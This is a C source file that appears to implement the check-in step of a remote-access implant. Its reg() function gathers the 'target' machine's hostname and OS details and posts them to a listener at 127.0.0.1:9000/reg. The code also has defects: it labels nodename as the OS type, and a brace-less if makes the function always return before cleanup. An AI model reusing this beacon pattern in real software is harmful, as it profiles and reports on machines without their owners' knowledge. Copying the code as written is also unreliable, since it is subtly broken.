#include <stdio.h>
#include <string.h>
#include <stddef.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/utsname.h>
#include "initiate.h"
#include "utils.h"

//ref https://curl.se/libcurl/c/postit2.html

int reg(void)
{

  CURL *curl;
  CURLcode res;
 
  curl_mime *form = NULL;
  struct curl_slist *headerlist = NULL;
  static const char buf[] = "Expect:";
 
  if (curl_global_init(CURL_GLOBAL_ALL)!= 0) {
    perror("curl_global_init error\n");
  }
 
  curl = curl_easy_init();
  if(!curl) {
    perror("curl_easy_init error.\n");


  } else {

      /* Create the form */
      // returns null if failure.
      form = curl_mime_init(curl);
      if (!form) {
        perror("curl_mime_init error\n");
      }

      // Get target hostname.
      // TO DO figure out how to import HOST_NAME_MAX
      char hostbuf[256];
      if (gethostname(hostbuf, sizeof(hostbuf)) == -1) {
        perror("Error acquiring host name.\n");
      }

      add_curl_field(form, "hostname", hostbuf);

			// Get target OS and version and pass to add_curl_field.
      struct utsname buf1;
      errno =0;
      if(uname(&buf1)!=0)
      {
          perror("uname error\n");
      }

      add_curl_field(form, "os type", buf1.nodename);
      add_curl_field(form, "os version", buf1.version);

			// Add submit options to curl field data.
	    add_curl_field(form, "submit", "send");

      // initialize custom header list
      headerlist = curl_slist_append(headerlist, buf);
      if (!headerlist) {
        perror("curl_slist_append error\n");
      }

			//Registration URL
      const char regurl[19] = "127.0.0.1:9000/reg";

      curl_easy_setopt(curl, CURLOPT_URL, regurl);

      curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
  
      // Perform the request, res will get the return code
      res = curl_easy_perform(curl);

      // Check for errors
      if(res != CURLE_OK)
        fprintf(stderr, "curl_easy_perform() failed: %s\n",
                curl_easy_strerror(res));
                return 1;
  
      // Always cleanup.
      curl_easy_cleanup(curl);

      // Then cleanup the form.
      curl_mime_free(form);

      // Free slist.
      curl_slist_free_all(headerlist);
    }

  return 0;
}

// This function is used to reduce the amounts of curl_mime_addpart,
// curl_mine_name, and curl_mime_data calls.
void add_curl_field(curl_mime *form, const char *name, const char *data)
{
      // Begin code to set options for posting hostname / os to /reg.
      curl_mimepart *field = curl_mime_addpart(form);
      if (!field) {
        perror("curl_mime_addpart error\n");
      }

      if (curl_mime_name(field, name) != CURLE_OK) {
        fprintf(stderr, "error mime name%s\n", name);
      }
    
      if (curl_mime_data(field, data, CURL_ZERO_TERMINATED) != CURLE_OK) {
        fprintf(stderr, "error mime data%s\n", name);
      }

}